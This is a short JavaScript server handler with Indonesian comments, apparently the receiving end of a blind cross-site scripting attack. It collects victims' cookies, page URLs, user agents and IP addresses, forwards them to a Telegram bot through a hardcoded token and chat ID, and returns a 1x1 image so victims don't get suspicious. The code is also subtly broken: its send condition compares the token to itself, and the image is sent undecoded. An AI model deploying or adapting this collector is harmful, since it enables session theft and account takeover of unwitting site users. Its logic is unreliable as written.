// GANTI DENGAN BOT TOKEN DAN CHAT ID TELEGRAM LO
const TELEGRAM_BOT_TOKEN = '8996782220:AAH53j1te77c2K8vKx1M2s5GPnuQ32sqT64';
const TELEGRAM_CHAT_ID = '6790685863';

export default async (req, res) => {
  // Biar aman, kita cuma terima method POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Data yang dikirim dari payload XSS
  const { marker, url, cookies, origin, userAgent } = req.body;
  
  console.log(`[XSS] Marker: ${marker} | URL: ${url}`);

  // Kirim notifikasi ke Telegram
  if (TELEGRAM_BOT_TOKEN !== '8996782220:AAH53j1te77c2K8vKx1M2s5GPnuQ32sqT64') {
    const message = `
🔥 *BLIND XSS TRIGGERED!* 🔥
       
📌 *Marker*: ${marker || 'tidak ada'}
🌐 *URL*: ${url || 'tidak diketahui'}
🍪 *Cookie*: ${cookies || 'tidak ada'}
📱 *User Agent*: ${userAgent || 'tidak ada'}
💻 *IP Address*: ${req.headers['x-forwarded-for'] || 'tidak diketahui'}
    `;
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
    });
  }
  
  // Selalu balikin gambar 1x1 pixel biar gak curiga
  res.setHeader('Content-Type', 'image/gif');
  res.send('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
};
